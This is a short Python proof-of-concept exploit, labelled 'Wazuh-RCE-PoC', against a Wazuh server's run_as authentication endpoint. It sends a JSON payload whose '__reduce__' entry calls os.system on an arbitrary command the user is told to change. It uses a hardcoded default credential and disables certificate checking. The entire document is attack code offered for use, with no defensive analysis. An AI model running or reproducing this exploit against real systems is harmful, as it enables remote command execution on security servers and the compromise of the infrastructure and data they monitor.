import requests
import json
import base64

# === CONFIGURATION ===
target = "http://target.com:55000"  # Replace with actual Wazuh server
endpoint = "/security/user/authenticate/run_as"
url = f"{target}{endpoint}"

# Replace with real credentials if needed
username = "wazuh-wui"
password = "MyS3cr37P450r.*-"
auth_header = base64.b64encode(f"{username}:{password}".encode()).decode()

# === CHANGE THIS TO ANY COMMAND YOU WANT TO RUN ===
command = "whoami"

# === MALICIOUS PAYLOAD ===
payload = {
    "__reduce__": [
        "__import__('os').system",
        [command]
    ]
}

headers = {
    "Authorization": f"Basic {auth_header}",
    "Content-Type": "application/json",
    "Accept": "application/json",
    "User-Agent": "Wazuh-RCE-PoC",
}

# === SEND EXPLOIT ===
response = requests.post(url, headers=headers, data=json.dumps(payload), verify=False)

# === PRINT RESULTS ===
print(f"[+] Sent payload to: {url}")
print(f"[+] Status Code: {response.status_code}")
print("[+] Response Body:")
print(response.text)
